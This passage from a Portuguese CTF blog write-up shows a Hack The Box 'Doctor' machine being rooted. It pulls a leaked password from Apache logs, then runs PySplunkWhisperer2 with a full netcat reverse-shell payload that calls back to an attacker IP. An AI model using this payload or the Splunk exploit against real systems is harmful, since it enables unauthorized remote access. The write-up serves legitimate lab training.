+drwxrwxr-x  2 root              root            4096 Jul 26  2020 installer/
+drwxr-sr-x+ 3 root              systemd-journal 4096 Jul 20  2020 journal/
+drwxr-xr-x  2 root              root            4096 Sep  5  2019 openvpn/
+drwx------  2 root              root            4096 Apr 23  2020 private/
+drwx------  2 speech-dispatcher root            4096 Jan 19  2020 speech-dispatcher/
+drwxr-x---  2 root              adm             4096 Jan 30 19:13 unattended-upgrades/
+</code></pre></div></div>
+
+<p>Iniciando com os logs do Apache2, como este é um dos serviços previamente enumerados e, considerando a data de criação desta máquina (assim podemos ignorar as informações mais recentes nela, que podem ser fruto de atividades de outros usuários), encontrei um arquivo interessante chamado <strong>backup</strong> que não é padrão do serviço:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>web@doctor:/var/log/apache2<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'Jan 3'</span>
+total 7980
+<span class="nt">-rw-r-----</span>  1 root adm       1266 Sep  5 11:58 access.log.10.gz
+<span class="nt">-rw-r-----</span>  1 root adm        323 Aug 21 13:00 access.log.11.gz
+<span class="nt">-rw-r-----</span>  1 root adm        270 Aug 18 12:48 access.log.12.gz
+<span class="nt">-rw-r--r--</span>  1 root root   2194472 Jul 27  2020 access.log.13.gz
+<span class="nt">-rw-r-----</span>  1 root adm        668 Sep 28 15:02 access.log.2.gz
+<span class="nt">-rw-r-----</span>  1 root adm       1493 Sep 23 15:20 access.log.3.gz
+<span class="nt">-rw-r-----</span>  1 root adm       3951 Sep 22 12:58 access.log.4.gz
+<span class="nt">-rw-r-----</span>  1 root adm       1341 Sep 19 19:17 access.log.5.gz
+<span class="nt">-rw-r-----</span>  1 root adm     664054 Sep 15 14:27 access.log.6.gz
+<span class="nt">-rw-r-----</span>  1 root adm        384 Sep 14 10:07 access.log.7.gz
+<span class="nt">-rw-r-----</span>  1 root adm       3018 Sep  7 17:24 access.log.8.gz
+<span class="nt">-rw-r-----</span>  1 root adm       1338 Sep  6 22:46 access.log.9.gz
+<span class="nt">-rw-r-----</span>  1 root adm      21578 Sep 17 16:23 backup
+<span class="nt">-rw-r-----</span>  1 root adm        460 Sep 15 00:00 error.log.10.gz
+<span class="nt">-rw-r-----</span>  1 root adm        476 Sep  7 17:46 error.log.11.gz
+<span class="nt">-rw-r-----</span>  1 root adm        537 Sep  6 22:47 error.log.12.gz
+<span class="nt">-rw-r-----</span>  1 root adm        680 Sep  5 11:58 error.log.13.gz
+<span class="nt">-rw-r-----</span>  1 root adm        341 Sep  5 00:00 error.log.14.gz
+<span class="nt">-rw-r-----</span>  1 root adm        789 Sep 28 15:07 error.log.2.gz
+<span class="nt">-rw-r-----</span>  1 root adm       1092 Sep 23 15:42 error.log.3.gz
+<span class="nt">-rw-r-----</span>  1 root adm        846 Sep 22 13:03 error.log.4.gz
+<span class="nt">-rw-r-----</span>  1 root adm        655 Sep 22 10:40 error.log.5.gz
+<span class="nt">-rw-r-----</span>  1 root adm        352 Sep 19 00:00 error.log.6.gz
+<span class="nt">-rw-r-----</span>  1 root adm        424 Sep 18 00:00 error.log.7.gz
+<span class="nt">-rw-r-----</span>  1 root adm        428 Sep 17 00:00 error.log.8.gz
+<span class="nt">-rw-r-----</span>  1 root adm        629 Sep 16 00:00 error.log.9.gz
+<span class="nt">-rw-r--r--</span>  1 root root         0 Jul 27  2020 other_vhosts_access.log
+</code></pre></div></div>
+
+<p>Verificando seu conteúdo, buscando pelas query strings únicas logadas nos requests, encontramos uma entrada interessante que traz um valor que possivelmente poderia ser utilizado como senha: <strong>Guitar123</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>web@doctor:/var/log/apache2<span class="nv">$ </span><span class="nb">awk</span> <span class="nt">-F</span><span class="s2">" "</span> <span class="s1">'{print $7}'</span> backup | <span class="nb">sort</span> | <span class="nb">uniq</span>
+/
+12.1.2<span class="se">\n</span><span class="s2">"
+400
+/evox/about
+/favicon.ico
+/.git/HEAD
+/HNAP1
+/home
+/icons/ubuntu-logo.png
+/login
+/nmaplowercheck1599231606
+/nmaplowercheck1599231646
+/post/new
+/register
+/reset_password?email=Guitar123"</span>
+/robots.txt
+/sdk
+/static/main.css
+/static/profile_pics/default.gif
+</code></pre></div></div>
+
+<p>Como o outro usuário desta máquina é o <strong>shaun</strong>, tentando utilizar o usuário e senha que temos até o momento, tive sucesso ao logar com a conta mencionada, o que permitiu obter a flag contida em <code class="language-plaintext highlighter-rouge">/home/shaun/user.txt</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>web@doctor:~<span class="nv">$ </span>su shaun
+Password:
+
+shaun@doctor:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 44
+drwxr-xr-x 6 shaun shaun 4096 Sep 15 12:51 <span class="nb">.</span>
+drwxr-xr-x 4 root  root  4096 Sep 19 16:54 ..
+lrwxrwxrwx 1 root  root     9 Sep  7 14:31 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 shaun shaun  220 Sep  6 16:26 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 shaun shaun 3771 Sep  6 16:26 .bashrc
+drwxr-xr-x 4 shaun shaun 4096 Sep 22 13:00 .cache
+drwx------ 4 shaun shaun 4096 Sep 15 11:14 .config
+drwx------ 4 shaun shaun 4096 Sep 15 11:57 .gnupg
+drwxrwxr-x 3 shaun shaun 4096 Sep  6 18:01 .local
+<span class="nt">-rw-r--r--</span> 1 shaun shaun  807 Sep  6 16:26 .profile
+<span class="nt">-rw-rw-r--</span> 1 shaun shaun   66 Sep 15 12:51 .selected_editor
+<span class="nt">-r--------</span> 1 shaun shaun   33 Jan 30 19:12 user.txt
+shaun@doctor:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<p>Agora logado como shaun, notei que ele não possui nenhum privilégio especial na maquina, além de não ter direitos de executar quaisquer comandos como root a partir do <code class="language-plaintext highlighter-rouge">sudo</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shaun@doctor:/tmp<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>shaun: 
+Sorry, user shaun may not run <span class="nb">sudo </span>on d
+</code></pre></div></div>
+
+<p>Após executar o script <code class="language-plaintext highlighter-rouge">linpeas.sh</code> do <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">PEASS - Privilege Escalation Awesome Scripts SUITE</a>, verificando os serviços em execução, o mais provável meio de obter um acesso root seria a partir do serviço <strong>splunkd</strong>, que está em execução com a conta de sistema e está publicado na porta TCP 8089, conforme listado no scan de reconhecimento inicial.</p>
+
+<p>Acessando este serviço manualmente, ao clicar no link <strong>services</strong>, conforme listado abaixo, uma janela de autenticação é exibida. Como a única credencial que possuímos é a do usuário shaun foi a primeira a ser tentada, onde tive sucesso <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20">.</p>
+
+<p><img src="https://i.imgur.com/R4VNKDe.png" alt="HTB Doctor - Splunkd" class="align-center"></p>
+
+<p><img src="https://i.imgur.com/lsTJ2cg.png" alt="HTB Doctor - Services" class="align-center"></p>
+
+<p>Uma vez que temos credenciais para logon no serviço do Splunk, o próximo passo é encontrar uma forma de obter execução remota de código através do mesmo. Após alguma pesquisa, encontrei este link <a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">Abusing Splunk Forwarders For Shells and Persistence · Eapolsniper’s Blog</a> que menciona um script disponível em <a href="https://github.com/cnotin/SplunkWhisperer2">GitHub - cnotin/SplunkWhisperer2: Local privilege escalation, or remote code execution, through Splunk Universal Forwarder (UF) misconfigurations</a>, que permitirá exatamente o que estávamos procurando.</p>
+
+<p>Após executar o comando conforme abaixo, foi possível obter um shell reverso rodando sob o contexto de root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 ./PySplunkWhisperer2_remote.py <span class="nt">--host</span> 10.10.10.209 <span class="nt">--port</span> 8089 <span class="nt">--username</span> shaun <span class="nt">--password</span> Guitar123 <span class="nt">--payload</span> <span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f"</span> <span class="nt">--lhost</span> 10.10.10.10
+Running <span class="k">in </span>remote mode <span class="o">(</span>Remote Code Execution<span class="o">)</span>
+<span class="o">[</span>.] Authenticating...
+<span class="o">[</span>+] Authenticated
+<span class="o">[</span>.] Creating malicious app bundle...
+<span class="o">[</span>+] Created malicious app bundle <span class="k">in</span>: /tmp/tmpcae79s9x.tar
+<span class="o">[</span>+] Started HTTP server <span class="k">for </span>remote mode
+<span class="o">[</span>.] Installing app from: http://10.10.10.10:8181/
+10.10.10.209 - - <span class="o">[</span>04/Feb/2021 19:46:38] <span class="s2">"GET / HTTP/1.1"</span> 200 -
+<span class="o">[</span>+] App installed, your code should be running now!
+
+Press RETURN to cleanup
+
+<span class="o">[</span>.] Removing app...
+<span class="o">[</span>+] App removed
+<span class="o">[</span>+] Stopped HTTP server
+Bye!
+</code></pre></div></div>
+
+<p>A partir deste shell, a obtenção da flag em <code class="language-plaintext highlighter-rouge">/root/root.txt</code> pode ocorrer sem problemas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat /root/root.txt</span>
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<p>Espero que tenha sido útil!</p>
+
+<p>Até o próximo post! <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#htb-easy" class="page__taxonomy-item" rel="tag">htb-easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#htb-linux" class="page__taxonomy-item" rel="tag">htb-linux</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categorias: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categorias/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Atualizado em:</strong> <time datetime="2021-02-06T09:00:00-03:00">February 6, 2021</time></p>
+
+
+      </footer>
+
+      <section id="sharelinks" class="page__share">
+  
+    <h4 class="page__share-title">Compartilhe</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?via=zerahzurc&amp;text=Hackthebox+write-up%3A+Doctor%20https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F02%2Fhtb-doctor%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F02%2Fhtb-doctor%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F02%2Fhtb-doctor%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+
+  <a href="whatsapp://send?text=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F02%2Fhtb-doctor%2F" data-action="share/whatsapp/share" class="btn btn--whatsapp" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Whatsapp"><i class="fab fa-fw fa-whatsapp" aria-hidden="true"></i><span> Whatsapp</span></a>
+
+  <a href="https://telegram.me/share/url?url=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F02%2Fhtb-doctor%2F&amp;text=Hackthebox+write-up%3A+Doctor" class="btn btn--telegram" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Telegram"><i class="fab fa-fw fa-telegram-plane" aria-hidden="true"></i><span> Telegram</span></a>
+
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="#" class="pagination--pager disabled">Anterior</a>
+    
+    
+      
+        <a href="/writeup/2021/02/htb-academy/" class="pagination--pager" title="Hackthebox write-up: Academy
+">Próxima</a>
+        
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Deixe um comentário</h4>
+      <section id="utterances-comments"></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">Talvez você também goste</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/BmkB4rb.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/06/htb-tenet/" rel="permalink">Hackthebox write-up: Tenet
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-06-12T13:00:00-03:00">June 12, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          7 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/02/htb-doctor/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Tenet, outra máquina Linux classificada como mediana do Hack The Box, criada por egotisticalSW.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/wHnMfBz.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/06/htb-scriptkiddie/" rel="permalink">Hackthebox write-up: ScriptKiddie
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-06-05T13:00:00-03:00">June 5, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/02/htb-doctor/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será ScriptKiddie, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xdf.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/FTjLM76.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/05/htb-delivery/" rel="permalink">Hackthebox write-up: Delivery
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-05-22T13:00:00-03:00">May 22, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          8 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/02/htb-doctor/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Delivery, outra máquina Linux classificada como fácil do Hack The Box, criada por ippsec.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/R2EVM1J.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/05/htb-ready/" rel="permalink">Hackthebox write-up: Ready
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-05-15T13:00:00-03:00">May 15, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/02/htb-doctor/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Ready, outra máquina Linux classificada como mediana do Hack The Box, criada por bertolis.
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Pesquisar...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- Osano - consent -->
+<script src="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.js" data-cfasync="false"></script>
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+
+    
+    <li><strong>Acompanhe no</strong></li>
+    
+
+    
+    
+    
+    <li><a href="https://www.linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+    
+    
+    
+    <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+    
+    
+    
+    <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+    
+    
+    
+    <!-- Terms and Privacy -->
+    <li><a href="https://davicruz.com/termos-e-privacidade" rel="nofollow noopener noreferrer">
+        <i class="fas fa-user-shield" aria-hidden="true"></i> Termos de uso e Política Privacidade</a></li>
+    <!-- end Terms and Privacy -->
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<!-- Start Read in other languages-->
+<div class="page__footer-follow">
+  <ul>
+    
+    
+      
+    
+    
+    <li><a href="https://davicruz.com/en-US">Also available in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></li>
+    
+
+    
+
+    
+
+      
+      
+  </ul>
+</div>
+<!-- End Read in other languages-->
+
+<div class="page__footer-copyright">© 2021 Davi Cruz. Desenvolvido com <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <!-- start custom analytics snippet -->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-54883666-1"></script>
+<script>
+  function EnableGTAGonConsent(){
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-54883666-1', { 'anonymize_ip': true});
+  }
+</script>
+
+<!-- Microsoft Clarity -->
+<script type="text/javascript">
+  function EnableMSClarityonConsent(){
+    (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "5dnbfjo108");
+  }
+</script>
+
+<!-- end custom analytics snippet -->
+
+
+
+
+
+    <script>
+  'use strict';
+
+  (function() {
+    var commentContainer = document.querySelector('#utterances-comments');
+
+    if (!commentContainer) {
+      return;
+    }
+
+    var script = document.createElement('script');
+    script.setAttribute('src', 'https://utteranc.es/client.js');
+    script.setAttribute('repo', 'davi-cruz/davi-cruz.github.io');
+    script.setAttribute('issue-term', 'htb-doctor');
+    script.setAttribute('theme', 'github-dark');
+    script.setAttribute('crossorigin', 'anonymous');
+
+    commentContainer.appendChild(script);
+  })();
+</script>
+
+  
+
+
+
+
+    
+<!-- Cookie Consent Management -->
+<script>
+    var strMessage = "Este website utiliza cookies para garantir a você uma melhor experiência";
+    var strDismiss = "Entendi!";
+    var strAllow = "Permitir Cookies";
+    var strDeny = "Não, obrigado!";
+    var strLink = "Saiba Mais";
+    var strHref = "https://davicruz.com/termos-e-privacidade/";
+
+    window.cookieconsent.initialise({
+        "palette": {
+            "popup": {
+                "background": "#252e39"
+            },
+            "button": {
+                "background": "transparent",
+                "text": "#008288",
+                "border": "#008288"
+            }
+        },
+        "position": "bottom-left",
+        "type": "opt-in",
+        "content": {
+            "message": strMessage,
+            "dismiss": strDismiss,
+            "allow": strAllow,
+            "deny": strDeny,
+            "link": strLink,
+            "href": strHref
+        },
+        onInitialise: function (status) {
+            var type = this.options.type;
+            var didConsent = this.hasConsented();
+            if (type == 'opt-in' && didConsent) {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+            if (type == 'opt-out' && !didConsent) {
+                // disable cookies
+            }
+        },
+        onStatusChange: function (status, chosenBefore) {
+            var type = this.options.type;
+            var didConsent = this.hasConsented();
+            if (type == 'opt-in' && didConsent) {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+            if (type == 'opt-out' && !didConsent) {
+                // disable cookies
+            }
+        },
+        onRevokeChoice: function () {
+            var type = this.options.type;
+            if (type == 'opt-in') {
+                // disable cookies
+            }
+            if (type == 'opt-out') {
+                // enable cookies
+                EnableMSClarityonConsent();
+                EnableGTAGonConsent();
+            }
+        }
+    });
+</script>
+<!-- End of Cookie Consent Management -->
+
+  </body>
+</html>
